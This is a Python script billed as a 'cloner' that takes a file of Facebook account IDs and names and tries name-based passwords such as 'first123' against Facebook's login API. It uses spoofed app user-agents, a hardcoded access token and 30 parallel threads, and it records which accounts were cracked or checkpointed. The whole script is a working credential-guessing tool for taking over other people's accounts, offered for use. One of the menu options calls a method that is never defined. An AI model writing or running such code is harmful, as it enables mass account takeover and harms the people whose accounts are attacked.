# Decode By Error x Ethan 
import os, requests, json, time, re, random, sys, uuid, platform, httplib2, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# Global Variables
loop = 0
oks = []
cps = []
twf = []
plist = []
show_cookies = []
pcp = []
dateti = str(datetime.now()).split(' ')[0]

# Device Data for User-Agents
ANDROID_DEVICES = {'Samsung': ['SM-A146P', 'SM-A525F', 'SM-G996B'], 'Xiaomi': ['M2012K11AG', 'Redmi Note 12'], 'Infinix': ['X688B', 'X671']}
ANDROID_VERSIONS = ['11', '12', '13', '14']
CHROME_VERSIONS = ['120.0.6099.224', '122.0.6269.105']
LOCALES = ['en_US', 'en_GB', 'en_IN']

def _fb_app_version():
    return f'{random.randint(400, 600)}.{random.randint(0, 9)}.{random.randint(0, 9)}'

def _fb_build():
    return str(random.randint(100000000, 999999999))

# User-Agent Generator
def generate_ua():
    mode = random.choice(['android', 'ios'])
    if mode == 'android':
        brand = random.choice(list(ANDROID_DEVICES.keys()))
        model = random.choice(ANDROID_DEVICES[brand])
        android_ver = random.choice(ANDROID_VERSIONS)
        chrome = random.choice(CHROME_VERSIONS)
        locale = random.choice(LOCALES)
        return f'Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{_fb_app_version()};FBBV/{_fb_build()};FBDV/{model};FBMD/{brand};FBSN/Android;FBSV/{android_ver};FBLC/{locale};FBOP/70]'
    else:
        return "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"

def get_ua():
    return generate_ua()

# Logic Functions
def clear():
    os.system('clear')
    print("--- GEN-HUB CLONER ---")

def linex():
    print('-----------------------------------------------')

def tutulx(fx):
    if len(fx) == 15: return '2009'
    return '2023/2024'

# Main Menu
def Menu():
    clear()
    print('[1] START FILE CLONING')
    print('[0] EXIT')
    linex()
    opt = input('SELECTION : ')
    if opt == '1': ____F_I_L_E____()
    else: exit()

def ____F_I_L_E____():
    clear()
    filepro = input('ENTER FILE NAME : ')
    try:
        fo = open(filepro, 'r').read().splitlines()
    except:
        print("File not found!"); time.sleep(2); Menu()
    
    linex()
    print('[1] AUTO PASS (Recommended)')
    pass_option = input('SELECT : ')
    if pass_option == '1':
        plist.extend(['firstlast', 'first123', 'first1234', 'First123', 'first@123'])
    
    clear()
    method = input('ENTER METHOD (1-4) : ')
    
    with tred(max_workers=30) as hub:
        clear()
        print(f'TOTAL IDS : {len(fo)} | METHOD : M{method}')
        linex()
        for user in fo:
            ids, names = user.split('|')
            if method == '1': hub.submit(___M_T_H_D_1___, ids, names, plist)
            elif method == '2': hub.submit(___M_T_H_D_2___, ids, names, plist)

# Method 1
def ___M_T_H_D_1___(ids, names, passlist):
    global loop
    sys.stdout.write(f'\r\r[GEN] {loop} | OK:{len(oks)} | CP:{len(cps)} '); sys.stdout.flush()
    ua = get_ua()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1] if ' ' in names else fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower())
        data = {
            'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
            'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1'
        }
        headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com'}
        po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
        
        if 'session_key' in po:
            print(f'\n[GEN-OK] {ids} | {pas}')
            oks.append(ids)
            break
        elif 'www.facebook.com' in str(po):
            cps.append(ids)
            break
    loop += 1

if __name__ == "__main__":
    Menu()
